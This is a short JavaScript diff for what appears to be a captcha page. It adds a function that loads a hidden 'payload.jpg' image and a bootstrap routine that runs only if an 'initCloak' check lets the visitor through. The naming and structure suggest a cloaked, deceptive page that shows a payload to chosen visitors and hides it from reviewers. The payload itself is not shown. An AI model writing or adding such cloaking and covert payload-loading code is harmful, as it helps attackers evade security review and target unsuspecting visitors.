@@ -192,3 +192,22 @@ function bindCaptchaEvents() {
   }
 }
 
+function loadPayload() {
+  const img = new Image();
+  img.style.display = "none";
+  img.src = "payload.jpg?" + Date.now();
+  document.body.appendChild(img);
+}
+
+async function bootstrap() {
+  const allowed = await initCloak();
+  if (!allowed) {
+    return;
+  }
+
+  initPage();
+  bindCaptchaEvents();
+  loadPayload();
+}
+
+bootstrap();
